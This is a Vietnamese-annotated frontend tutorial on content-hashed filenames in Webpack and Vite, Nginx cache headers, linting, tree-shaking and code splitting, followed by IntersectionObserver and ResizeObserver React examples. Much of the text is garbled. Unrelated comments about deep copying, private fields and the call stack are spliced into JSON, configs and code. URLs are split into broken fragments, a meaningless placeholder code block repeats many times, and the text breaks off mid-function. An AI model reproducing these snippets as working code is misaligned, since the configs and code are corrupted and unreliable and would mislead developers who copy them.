// 📊 HASH STRATEGIES (Các Chiến Lược Hash)
 // Chú giải: ===================================================

/**
 * 1️⃣ [contenthash] - RECOMMENDED (Khuyên dùng)
 *    Hash dựa trên NỘI DUNG file
 *    → File không đổi → hash không đổi → cache hiệu quả
 *
 * 2️⃣ [chunkhash]
 *    Hash dựa trên CHUNK (group of modules)
 *    → Modules trong cùng chunk share hash
 *
 * 3️⃣ [hash] (fullhash)
 *    Hash dựa trên TOÀN BỘ build
 *    → Build mới → TẤT CẢ files đổi hash (không tối ưu)
 */

 // Chú giải: webpack.config.js (Webpack)
module.exports = {
  output: {
    path: path.resolve(__dirname, 'dist'),

 // Chú giải: ✅ RECOMMENDED: [contenthash] - hash theo nội dung
    filename: '[name].[contenthash:8].js',
 // Chú giải: ↑            ↑
    //             name chunk    8 ký tự hash

 // Chú giải: Output: main.a3f8b2c1.js, vendor.9d4e7f1a.js

 // Chú giải: Alternative strategies:
 // Chú giải: filename: '[name].[chunkhash:8].js',  // Hash theo chunk
    // filename: '[name].[fullhash:8].js',   // Hash toàn bộ build (không khuyên)
  },

  optimization: {
 // Chú giải: ⚠️ QUAN TRỌNG: moduleIds: 'deterministic'
    // → Đảm bảo module IDs không đổi giữa các builds
    // → vendor.js hash KHÔNG đổi nếu code không đổi
    moduleIds: 'deterministic',

    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendor',
          priority: 10
        }
      }
    }
  }
};

 // Chú giải: vite.config.ts (Vite)
import { defineConfig } from 'vite';

export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        // ✅ Vite tự động dùng content hash
        entryFileNames: '[name].[hash].js', // Chú giải: Entry files
        chunkFileNames: '[name].[hash].js', // Chú giải: Lazy chunks
        assetFileNames: '[name].[hash].[ext]', // Chú giải: CSS, images, fonts
      }
    }
  }
});

 // Chú giải: ===================================================
// 🎯 REAL-WORLD SCENARIO (Kịch Bản Thực Tế)
 // Chú giải: ===================================================

/**
 * 🏢 SCENARIO: E-commerce Website
 *
 * BEFORE Content Hashing:
 * ❌ Deploy version mới → Users vẫn thấy version cũ (cached)
 * ❌ Phải đợi cache expire (1 tuần) hoặc user hard refresh
 * ❌ Bug fix không đến users ngay lập tức
 *
 * AFTER Content Hashing:
 * ✅ Deploy version mới → Users TỰ ĐỘNG thấy version mới
 * ✅ Vendor files (React, libraries) cached vô thời hạn
 * ✅ Chỉ download files đã thay đổi
 */

 // Chú giải: Build Timeline Example:
/*
┌────────────────────────────────────────────────────────────┐
│         CONTENT HASHING TIMELINE                           │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  📅 MONDAY (Build #1 - Initial Release)                   │
│  ├── dist/                                                │
│  │   ├── index.html                                      │
│  │   ├── main.a3f8b2c1.js        (50 KB - app code)     │
│  │   ├── vendor.9d4e7f1a.js      (300 KB - React, etc.) │
│  │   └── styles.c4d9e2f3.css     (10 KB)                │
│  │                                                        │
│  └── User A visit:                                        │
│      ✅ Download all files (360 KB total)                │
│      ✅ Browser cache: 1 năm                              │
│                                                            │
│  📅 TUESDAY (Build #2 - Fix Bug in App Code)             │
│  ├── dist/                                                │
│  │   ├── index.html                                      │
│  │   ├── main.f7c5d3a9.js        (52 KB) ← HASH MỚI ✅  │
│  │   ├── vendor.9d4e7f1a.js      (300 KB) ← CŨ ✅       │
│  │   └── styles.c4d9e2f3.css     (10 KB) ← CŨ ✅        │
│  │                                                        │
│  └── User A revisit:                                      │
│      ✅ Download: index.html + main.f7c5d3a9.js (52 KB) │
│      ✅ From cache: vendor.js + styles.css (310 KB)     │
│      📊 Bandwidth saved: 86% (310/360)                   │
│                                                            │
│  📅 FRIDAY (Build #3 - Upgrade React 18.2 → 18.3)        │
│  ├── dist/                                                │
│  │   ├── index.html                                      │
│  │   ├── main.f7c5d3a9.js        (52 KB) ← CŨ ✅        │
│  │   ├── vendor.b8f1a4c7.js      (305 KB) ← HASH MỚI ✅ │
│  │   └── styles.c4d9e2f3.css     (10 KB) ← CŨ ✅        │
│  │                                                        │
│  └── User A revisit:                                      │
│      ✅ Download: index.html + vendor.b8f1a4c7.js       │
│      ✅ From cache: main.js + styles.css                │
│      📊 Smart caching: Chỉ tải files đổi!               │
└────────────────────────────────────────────────────────────┘
*/

 // Chú giải: ===================================================
 // Chú giải: 🔐 CACHE HEADERS với CONTENT HASH
 // Chú giải: ===================================================

 // Chú giải: Nginx configuration (production)
server {
  location / {
    root /var/www/html;

    # ⚠️ index.html: KHÔNG cache (luôn fresh)
    location = /index.html {
      add_header Cache-Control "no-cache, no-store, must-revalidate";
      add_header Pragma "no-cache";
      add_header Expires "0";
    }

    # ✅ Hashed files: Cache vô thời hạn (1 năm)
    location ~* \.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ttf|eot)$ {
      # Nếu file có hash trong tên (VD: main.a3f8b2c1.js)
      if ($request_filename ~* "\.([a-f0-9]{8})\.(js|css)$") {
        add_header Cache-Control "public, max-age=31536000, immutable";
        # immutable = Browser KHÔNG revalidate (tiết kiệm requests)
      }
    }
  }
}

 // Chú giải: ===================================================
// 📦 HTML INJECTION (Tự Động Inject Hash Files)
 // Chú giải: ===================================================

 // Chú giải: HtmlWebpackPlugin (Webpack)
const HtmlWebpackPlugin = require('html-webpack-plugin');

module.exports = {
  plugins: [
    new HtmlWebpackPlugin({
      template: './public/index.html', // Chú giải: Template HTML
      inject: 'body',                  // Inject scripts vào <body>
      minify: true // Chú giải: Minify HTML
    })
  ]
};

// public/index.html (Template - KHÔNG có hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
</head>
<body>
  <div id="root"></div>
  <!-- Scripts sẽ được inject tự động -->
</body>
</html>
*/

// dist/index.html (Generated - CÓ hash)
/*
<!DOCTYPE html>
<html>
<head>
  <title>My App</title>
  <link href="/styles.c4d9e2f3.css" rel="stylesheet"> ← Auto-injected
</head>
<body>
  <div id="root"></div>
  <script src="/vendor.9d4e7f1a.js"></script>  ← Auto-injected
  <script src="/main.a3f8b2c1.js"></script>    ← Auto-injected
</body>
</html>
*/

 // Chú giải: ===================================================
// 🎯 BEST PRACTICES (Thực Hành Tốt Nhất)
 // Chú giải: ===================================================

/**
 * ✅ DO (NÊN):
 * 1. Dùng [contenthash] cho production builds
 * 2. Cache hashed files: max-age=31536000 (1 năm)
 * 3. KHÔNG cache index.html (luôn fresh)
 * 4. Dùng moduleIds: 'deterministic' (Webpack)
 * 5. Split vendor code (React, libraries) ra riêng
 * 6. Tên file: [name].[contenthash:8].js (8 ký tự hash)
 *
 * ❌ DON'T (KHÔNG NÊN):
 * 1. Dùng [hash] (fullhash) → tất cả files đổi hash
 * 2. Cache index.html → users không thấy version mới
 * 3. Không split vendor → download lại React mỗi deploy
 * 4. Hash quá dài (>12 ký tự) → tên file dài
 */

 // Chú giải: ===================================================
// 📊 PERFORMANCE METRICS (Số Liệu Hiệu Suất)
 // Chú giải: ===================================================

/**
 * 🎯 REAL APP EXAMPLE (Ứng dụng thực tế):
 *
 * WITHOUT Content Hashing:
 * ├── Build #1: Users download 1.2 MB
 * ├── Build #2 (1 tuần sau): Users download 1.2 MB (lại!) ❌
 * ├── Build #3 (1 tuần sau): Users download 1.2 MB (lại!) ❌
 * └── Total: 3.6 MB trong 3 tuần
 *
 * WITH Content Hashing:
 * ├── Build #1: Users download 1.2 MB
 * │   ├── main.js: 200 KB
 * │   ├── vendor.js: 800 KB
 * │   └── styles.css: 200 KB
 * │
 * ├── Build #2: Users download 220 KB ✅
 * │   ├── main.js: 220 KB (changed - hash mới)
 * │   ├── vendor.js: from cache (không đổi)
 * │   └── styles.css: from cache (không đổi)
 * │
 * ├── Build #3: Users download 150 KB ✅
 * │   ├── main.js: from cache (không đổi)
 * │   ├── vendor.js: from cache (không đổi)
 * │   └── styles.css: 150 KB (changed - hash mới)
 * │
 * └── Total: 1.57 MB trong 3 tuần
 *
 * 📊 Bandwidth Saved: 2.03 MB (56% nhỏ hơn!) 🚀
 * ⚡ Load Time: Nhanh hơn 3-5x (từ cache)
 */

 // Chú giải: ===================================================
// 🔥 COMMON MISTAKES (Lỗi Thường Gặp)
 // Chú giải: ===================================================

 // Chú giải: ❌ MISTAKE 1: Cache index.html
 // Chú giải: nginx.conf
location = /index.html {
  add_header Cache-Control "max-age=3600"; // Chú giải: ❌ SAI! Cache 1 giờ
}
// → Users không thấy deploy mới trong 1 giờ!

 // Chú giải: ✅ FIX:
location = /index.html {
  add_header Cache-Control "no-cache"; // ✅ ĐÚNG! Luôn fresh
}

// ❌ MISTAKE 2: Dùng [hash] thay vì [contenthash]
filename: '[name].[hash:8].js'; // ❌ Tất cả files đổi hash mỗi build
// → vendor.js hash mới dù code không đổi → users tải lại 800 KB ❌

 // Chú giải: ✅ FIX:
filename: '[name].[contenthash:8].js'; // ✅ Chỉ files đổi mới có hash mới

// ❌ MISTAKE 3: Không split vendor code
 // Chú giải: → main.js chứa app + React (1 MB)
 // Chú giải: → Mỗi lần sửa app → users tải lại cả React ❌

 // Chú giải: ✅ FIX: Split vendor
optimization: {
  splitChunks: {
    cacheGroups: {
      vendor: {
        test: /[\\/]node_modules[\\/]/,
        name: 'vendor'
      }
    }
  }
}

 // Chú giải: ===================================================
// 💡 SUMMARY (Tóm Tắt)
 // Chú giải: ===================================================

/**
 * 🔐 CONTENT HASHING:
 *
 * ✅ LÀ GÌ?
 *    - Thêm hash vào tên file dựa trên nội dung
 *    - File thay đổi → hash mới → tên file mới
 *
 * ✅ HOẠT ĐỘNG SAO?
 *    1. Bundler hash nội dung file (MD5/SHA-256)
 *    2. Tạo string hash (a3f8b2c1)
 *    3. Rename: main.js → main.a3f8b2c1.js
 *    4. Update index.html với tên mới
 *
 * ✅ DÙNG ĐỂ LÀM GÌ?
 *    - Cache Busting: Users luôn thấy version mới
 *    - Long-term Caching: Cache files không đổi vô thời hạn
 *    - Performance: Chỉ download files đã thay đổi
 *    - Bandwidth Saving: Tiết kiệm 50-80% bandwidth
 *
 * ✅ KHI NÀO DÙNG?
 *    - LUÔN LUÔN dùng cho production builds!
 *    - Kết hợp với vendor splitting
 *    - Kết hợp với aggressive caching (1 năm)
 *
 * ✅ CÔNG CỤ:
 *    - Webpack: output.filename = '[name].[contenthash:8].js'
 *    - Vite: Tự động enable
 *    - Rollup: rollup-plugin-hash
 */

 // Chú giải: ============================================
 // Chú giải: 6. Real-world Trading App Example
 // Chú giải: ============================================

 // Chú giải: 🎯 Setup ESLint + Prettier + Tree-shaking + Code Splitting

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "name": "trading-app",
  "sideEffects": [
    "*.css",
    "./src/polyfills.ts" // Polyfills có side-effects
  ],
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "lint": "eslint . --ext .ts,.tsx",
    "format": "prettier --write \"src/**/*.{ts,tsx}\""
  }
}

 // Chú giải: vite.config.ts (Vite = modern bundler)
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  build: {
    sourcemap: true, // Chú giải: ✅ Generate source maps

    rollupOptions: {
      output: {
 // Chú giải: 📦 Manual chunks cho better caching
        manualChunks: {
          'vendor': ['react', 'react-dom'],
          'charts': ['recharts'], // Chú giải: Heavy chart library
          'utils': ['lodash-es', 'date-fns']
        }
      }
    }
  }
});

 // Chú giải: 📂 App structure với code splitting
 // Chú giải: src/App.tsx
import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

 // Chú giải: ✅ Lazy load pages
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Trading = lazy(() => import('./pages/Trading'));
const Portfolio = lazy(() => import('./pages/Portfolio'));
const Analytics = lazy(() => import('./pages/Analytics')); // Chú giải: Heavy (charts)

export default function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <Routes>
        <Route path="/" element={<Dashboard />} />
        <Route path="/trading" element={<Trading />} />
        <Route path="/portfolio" element={<Portfolio />} />
        <Route path="/analytics" element={<Analytics />} /> {/* Load khi cần */}
      </Routes>
    </Suspense>
  );
}

 // Chú giải: src/utils/index.ts (Tree-shakable exports)
 // Chú giải: ✅ GOOD: Named exports
export { calculateProfit } from './profit-calculator';
export { validateOrder } from './order-validator';
export { formatCurrency } from './formatters';

// KHÔNG dùng: export * from './profit-calculator' (barrel export)

 // Chú giải: src/pages/Analytics.tsx (Lazy load heavy components)
import { lazy, Suspense } from 'react';

 // Chú giải: ✅ Lazy load chart component (recharts lib ~500KB)
const ProfitChart = lazy(() => import('../components/ProfitChart'));

export default function Analytics() {
  return (
    <div>
      <h1>Analytics</h1>

      <Suspense fallback={<div>Loading chart...</div>}>
        <ProfitChart /> {/* Load khi render page này */}
      </Suspense>
    </div>
  );
}

 // Chú giải: 🎯 Build results:
 // Chú giải: ✅ main.js (50KB) - App shell + routing
// ✅ vendor.js (150KB) - React + ReactDOM (cache lâu)
// ✅ charts.js (500KB) - Recharts (load khi vào /analytics)
 // Chú giải: ✅ dashboard.chunk.js (30KB)
 // Chú giải: ✅ trading.chunk.js (40KB)
 // Chú giải: ✅ portfolio.chunk.js (35KB)
 // Chú giải: ✅ analytics.chunk.js (20KB)

// 💡 Lợi ích:
// - Initial load: 50KB + 150KB = 200KB (thay vì 825KB)
// - User vào /analytics → Load thêm charts.js (500KB) khi cần
 // Chú giải: - Faster initial render, better UX

```js
// Ví dụ rút gọn
const example = 42;
```

bash
   # Install
   npm install -D eslint prettier eslint-config-prettier
   npm install -D @typescript-eslint/parser @typescript-eslint/eslint-plugin

   # Run on pre-commit (husky + lint-staged)
   npx husky install
   npx husky add .husky/pre-commit "npx lint-staged"

```js
// Ví dụ rút gọn
const example = 42;
```

json
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
   {
     "lint-staged": {
       "*.{ts,tsx}": ["eslint --fix", "prettier --write"]
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

json
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
   {
     "compilerOptions": {
       "strict": true, // Chú giải: Enable tất cả strict checks
       "noUncheckedIndexedAccess": true, // Chú giải: Check array/object access
       "noImplicitReturns": true, // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
       "noFallthroughCasesInSwitch": true // Chú giải: Switch case phải break
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: ESLint format rules conflict với Prettier
   // .eslintrc.js (KHÔNG dùng indent, quotes rules)
   {
     rules: {
       'indent': ['error', 2], // Chú giải: ❌ Conflict với Prettier
       'quotes': ['error', 'single'] // Chú giải: ❌ Conflict với Prettier
     }
   }

   // ✅ GOOD: Dùng eslint-config-prettier
   {
     extends: ['prettier'] // Tắt format rules
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ BAD: Public source maps → leak source code
 // Chú giải: webpack.config.js
   {
     devtool: 'source-map', // Chú giải: .map files public
   }

   // ✅ GOOD: Hidden source maps hoặc serve riêng
   {
     devtool: 'hidden-source-map', // Không reference trong bundle
     output: {
       sourceMapFilename: '[file].map',
       publicPath: 'https: // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
     }
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   // ❌ BAD: CommonJS → tree-shaking KHÔNG work
   const utils = require('./utils'); // Chú giải: CommonJS

 // Chú giải: ❌ BAD: Default export + destructure
   export default { add, subtract, multiply };
   import utils from './utils';
   const { add } = utils; // Chú giải: Bundle chứa cả subtract, multiply

 // Chú giải: ❌ BAD: Barrel exports với side-effects
 // Chú giải: index.ts
   export * from './moduleA'; // moduleA có side-effects

 // Chú giải: ✅ GOOD: Named exports + ESM
   export function add(a, b) {
     return a + b;
   }
   import { add } from './utils'; // Chú giải: Chỉ bundle add()

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   // ❌ BAD: Split quá nhỏ → nhiều HTTP requests
   const Button = lazy(() => import('./Button')); // ❌ Component nhỏ không nên split
   const Icon = lazy(() => import('./Icon')); // ❌ Quá nhỏ

   // ✅ GOOD: Chỉ split components/routes nặng
   const Dashboard = lazy(() => import('./pages/Dashboard')); // ✅ Page nặng
   const ChartLibrary = lazy(() => import('./ChartLibrary')); // ✅ Library nặng (500KB+)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
   {
     "paths": {
       "@utils/*": ["./src/utils/*"]
     }
   }

 // Chú giải: ❌ BAD: Import từ barrel file
   import { add } from '@utils'; // Chú giải: → import from index.ts (barrel)
   // Tree-shaking kém vì phải load toàn bộ index.ts

   // ✅ GOOD: Import trực tiếp
   import { add } from '@utils/math'; // → import trực tiếp

```js
// Ví dụ rút gọn
const example = 42;
```

json
   // ❌ BAD: Không set sideEffects
 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
   {} // Bundler assume MỌI module có side-effects

 // Chú giải: ✅ GOOD: Explicit declare
   {
     "sideEffects": false // Hoặc ["*.css", "polyfills.ts"]
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   // ❌ BAD: Không handle error
   const mod = await import('./module'); // Nếu fail → crash app

 // Chú giải: ✅ GOOD: Handle error
   try {
     const mod = await import('./module');
     mod.doSomething();
   } catch (error) {
     console.error('Failed to load module:', error);
 // Chú giải: Fallback logic
   }

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────────┐
│                    OBSERVER APIs                              │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  1️⃣ INTERSECTION OBSERVER (Quan sát giao điểm)              │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Theo dõi element vào/ra khỏi viewport                 │ │
│  │ • Use cases: Lazy loading, Infinite scroll, Analytics   │ │
│  │ • Thay thế: scroll event + getBoundingClientRect()      │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  2️⃣ RESIZE OBSERVER (Quan sát thay đổi kích thước)          │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Theo dõi thay đổi kích thước của element              │ │
│  │ • Use cases: Responsive components, Charts, Layouts     │ │
│  │ • Thay thế: window.resize event + polling               │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  3️⃣ MUTATION OBSERVER (Quan sát thay đổi DOM)               │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │ • Theo dõi thay đổi DOM tree (add/remove/modify)        │ │
│  │ • Use cases: Auto-init, Debug, Third-party integration  │ │
│  │ • Thay thế: Mutation Events (deprecated)                │ │
│  └─────────────────────────────────────────────────────────┘ │
└──────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { useEffect, useRef, useState } from 'react';

 // Chú giải: ============================================
 // Chú giải: A. LAZY LOADING IMAGES (Tải Ảnh Lười)
 // Chú giải: ============================================

// Giải thích: Chỉ tải ảnh khi user scroll đến gần → tiết kiệm bandwidth, tăng tốc độ load trang

function LazyImage({ src, alt }: { src: string; alt: string }) {
  const imgRef = useRef<HTMLImageElement>(null);
  const [imageSrc, setImageSrc] = useState<string>(''); // Chú giải: Ảnh thật chưa load
  const [isLoaded, setIsLoaded] = useState(false);

  useEffect(() => {
 // Chú giải: Tạo Intersection Observer
    const observer = new IntersectionObserver(
      (entries) => {
        // entries: Danh sách các elements đang được observe
        entries.forEach((entry) => {
          // entry.isIntersecting: true = element xuất hiện trong viewport
          if (entry.isIntersecting && !isLoaded) {
            console.log('✅ Image vào viewport, bắt đầu load:', src);

 // Chú giải: Load ảnh thật
            setImageSrc(src);
            setIsLoaded(true);

            // Ngừng observe sau khi load (không cần theo dõi nữa)
            observer.unobserve(entry.target);
          }
        });
      },
      {
        root: null, // null = observe trong viewport (màn hình)

        // rootMargin: Mở rộng vùng observe
        // '50px' = trigger khi element còn cách viewport 50px
        // → Preload ảnh trước khi user nhìn thấy (UX mượt hơn)
        rootMargin: '50px',

        // threshold: Ngưỡng % element hiển thị để trigger callback
 // Chú giải: 0.1 = trigger khi 10% element visible
        threshold: 0.1
      }
    );

    // Bắt đầu observe image element
    if (imgRef.current) {
      observer.observe(imgRef.current);
    }

 // Chú giải: Cleanup: Disconnect observer khi component unmount
    return () => {
      observer.disconnect();
    };
  }, [src, isLoaded]);

  return (
    <div className="lazy-image-container">
      {!imageSrc ? (
 // Chú giải: Placeholder khi chưa load (skeleton)
        <div className="skeleton-loader" style={{ width: '100%', height: 300, background: '#e0e0e0' }}>
          <span>Đang tải...</span>
        </div>
      ) : (
        <img
          ref={imgRef}
          src={imageSrc}
          alt={alt}
          onLoad={() => console.log('✅ Image đã load xong')}
        />
      )}
    </div>
  );
}

 // Chú giải: Sử dụng:
function Gallery() {
  const images = [
    'https: // Chú giải: example.com/image1.jpg',
    'https: // Chú giải: example.com/image2.jpg',
 // Chú giải: ... 100+ images
  ];

  return (
    <div className="gallery">
      {images.map((src, i) => (
        <LazyImage key={i} src={src} alt={`Image ${i + 1}`} />
      ))}
    </div>
  );
}
// Kết quả: Chỉ load 5-10 ảnh đầu tiên (trong viewport) thay vì 100+ ảnh cùng lúc
 // Chú giải: → Trang load nhanh hơn 10x!

 // Chú giải: ============================================
// B. INFINITE SCROLL (Cuộn Vô Hạn)
 // Chú giải: ============================================

// Giải thích: Tự động load thêm data khi user scroll đến cuối danh sách

interface Order {
  id: string;
  symbol: string;
  price: number;
}

function InfiniteOrderList() {
  const [orders, setOrders] = useState<Order[]>([]);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);
  const [isLoading, setIsLoading] = useState(false);

  // Ref cho sentinel element (phần tử "canh gác" ở cuối list)
  const sentinelRef = useRef<HTMLDivElement>(null);

 // Chú giải: Load more data
  const loadMoreOrders = async () => {
    if (isLoading || !hasMore) return;

    setIsLoading(true);
    console.log(`📥 Đang load page ${page}...`);

    try {
      const res = await fetch(`/api/orders?page=${page}&limit=20`);
      const newOrders = await res.json();

      if (newOrders.length === 0) {
        setHasMore(false); // Hết data
        console.log('✅ Đã load hết orders');
      } else {
        setOrders(prev => [...prev, ...newOrders]);
        setPage(prev => prev + 1);
        console.log(`✅ Load thành công ${newOrders.length} orders`);
      }
    } catch (error) {
      console.error('❌ Lỗi load orders:', error);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
 // Chú giải: Tạo observer cho sentinel element
    const observer = new IntersectionObserver(
      (entries) => {
        const sentinel = entries[0];

        // Khi sentinel xuất hiện trong viewport → load more
        if (sentinel.isIntersecting && hasMore && !isLoading) {
          console.log('🔄 Sentinel vào viewport → Load more...');
          loadMoreOrders();
        }
      },
      {
        root: null,
        rootMargin: '100px', // Trigger sớm 100px (load trước khi user scroll đến cuối)
        threshold: 0
      }
    );

    if (sentinelRef.current) {
      observer.observe(sentinelRef.current);
    }

    return () => observer.disconnect();
  }, [hasMore, isLoading, page]);

 // Chú giải: Load initial data
  useEffect(() => {
    loadMoreOrders();
  }, []);

  return (
    <div className="order-list">
      <h2>📋 Orders (Infinite Scroll)</h2>

      {orders.map((order) => (
        <div key={order.id} className="order-item">
          <span>{order.symbol}</span>
          <span>${order.price}</span>
        </div>
      ))}

      {/* Sentinel element: Phần tử "canh gác" ở cuối list */}
      <div ref={sentinelRef} style={{ height: 20 }}>
        {isLoading && <span>⏳ Đang tải thêm...</span>}
        {!hasMore && <span>✅ Đã hiển thị tất cả</span>}
      </div>
    </div>
  );
}
// Cách hoạt động:
 // Chú giải: 1. User scroll xuống
// 2. Sentinel element vào viewport
 // Chú giải: 3. Observer trigger → loadMoreOrders()
// 4. Fetch data mới, append vào list
// 5. Lặp lại cho đến khi hết data

 // Chú giải: ============================================
// C. VISIBILITY TRACKING (Theo Dõi Hiển Thị)
 // Chú giải: ============================================

// Giải thích: Track % element hiển thị → gửi analytics
// VD: Biết được section nào user đọc nhiều nhất

function VisibilityTracker({ children, id }: { children: React.ReactNode; id: string }) {
  const elementRef = useRef<HTMLDivElement>(null);
  const [visibilityPercentage, setVisibilityPercentage] = useState(0);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // intersectionRatio: Tỷ lệ % element hiển thị (0.0 - 1.0)
          const percentage = Math.round(entry.intersectionRatio * 100);
          setVisibilityPercentage(percentage);

          console.log(`👁️ Section "${id}" hiển thị: ${percentage}%`);

 // Chú giải: Gửi analytics khi >50% visible
          if (percentage > 50) {
 // Chú giải: analytics.track('section_viewed', { id, percentage });
          }
        });
      },
      {
        root: null,
        threshold: [0, 0.25, 0.5, 0.75, 1.0] // Track ở nhiều mức: 0%, 25%, 50%, 75%, 100%
      }
    );

    if (elementRef.current) {
      observer.observe(elementRef.current);
    }

    return () => observer.disconnect();
  }, [id]);

  return (
    <div ref={elementRef} className="tracked-section">
      <div className="visibility-indicator">
        Hiển thị: {visibilityPercentage}%
      </div>
      {children}
    </div>
  );
}

 // Chú giải: Sử dụng:
function Article() {
  return (
    <article>
      <VisibilityTracker id="section-1">
        <h2>Phần 1: Giới thiệu</h2>
        <p>Nội dung...</p>
      </VisibilityTracker>

      <VisibilityTracker id="section-2">
        <h2>Phần 2: Phát triển</h2>
        <p>Nội dung...</p>
      </VisibilityTracker>
    </article>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   rootMargin: '50px' // Load trước khi vào viewport 50px → UX mượt

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   if (entry.isIntersecting) {
     // Xử lý...
     observer.unobserve(entry.target); // Ngừng observe → tiết kiệm tài nguyên
   }

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
   threshold: [0, 0.25, 0.5, 0.75, 1] // Track ở 5 mức độ

```js
// Ví dụ rút gọn
const example = 42;
```

html
   <img src="image.jpg" loading="lazy" /> <!-- Browser native lazy load -->

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ LỖI 1: Dùng scroll event + getBoundingClientRect() (chậm, gây layout thrashing)
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect(); // Chú giải: ❌ Trigger reflow mỗi scroll
    if (rect.top < window.innerHeight) {
 // Chú giải: Load image...
    }
  });
});

// ✅ SỬA: Dùng IntersectionObserver (tối ưu, không block main thread)
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
 // Chú giải: Load image...
    }
  });
});
images.forEach((img) => observer.observe(img));

// ❌ LỖI 2: Quên disconnect observer → memory leak
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
  // ❌ Thiếu cleanup
}, []);

// ✅ SỬA: Luôn cleanup
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);

  return () => {
    observer.disconnect(); // Chú giải: ✅ Cleanup khi unmount
  };
}, []);

```js
// Ví dụ rút gọn
const example = 42;
```

ts
// Lazy load images khi vào viewport
const images = document.querySelectorAll('img[data-src]');

const imageObserver = new IntersectionObserver(
  (entries, observer) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const img = entry.target as HTMLImageElement;
 // Chú giải: Load ảnh thật
        img.src = img.dataset.src!;
        img.removeAttribute('data-src');
 // Chú giải: Ngừng observe sau khi load
        observer.unobserve(img);
      }
    });
  },
  {
    root: null, // Chú giải: viewport
    rootMargin: '50px', // trigger 50px trước khi vào viewport
    threshold: 0.1, // 10% visible là trigger
  }
);

images.forEach((img) => imageObserver.observe(img));

 // Chú giải: Infinite scroll example
const sentinel = document.querySelector('#load-more-trigger');
const loadMoreObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting) {
    loadMoreContent(); // fetch thêm data
  }
});
if (sentinel) loadMoreObserver.observe(sentinel);

 // Chú giải: Cleanup
 // Chú giải: loadMoreObserver.disconnect();

```js
// Ví dụ rút gọn
const example = 42;
```

ts
// ❌ Dùng scroll listener + getBoundingClientRect → chậm, layout thrashing
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect();
    if (rect.top < window.innerHeight) {
 // Chú giải: load image
    }
  });
});

// ✅ Dùng IntersectionObserver
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
 // Chú giải: load image
    }
  });
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
import { useEffect, useRef, useState } from 'react';

 // Chú giải: ============================================
 // Chú giải: A. RESPONSIVE COMPONENT (Component Tự Responsive)
 // Chú giải: ============================================

// Giải thích: Component tự điều chỉnh layout khi kích thước thay đổi
// Không cần media queries → component portable, reusable

function ResponsiveCard() {
  const cardRef = useRef<HTMLDivElement>(null);
  const [layout, setLayout] = useState<'horizontal' | 'vertical'>('horizontal');
  const [dimensions, setDimensions] = useState({ width: 0, height: 0 });

  useEffect(() => {
 // Chú giải: Tạo Resize Observer
    const resizeObserver = new ResizeObserver((entries) => {
      // entries: Danh sách các elements đang observe
      for (const entry of entries) {
        // contentRect: Kích thước content box của element
        const { width, height } = entry.contentRect;

        console.log(`📏 Card resize: ${width}x${height}`);
        setDimensions({ width, height });

        // Tự động chuyển layout dựa vào width
        if (width < 500) {
          setLayout('vertical'); // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
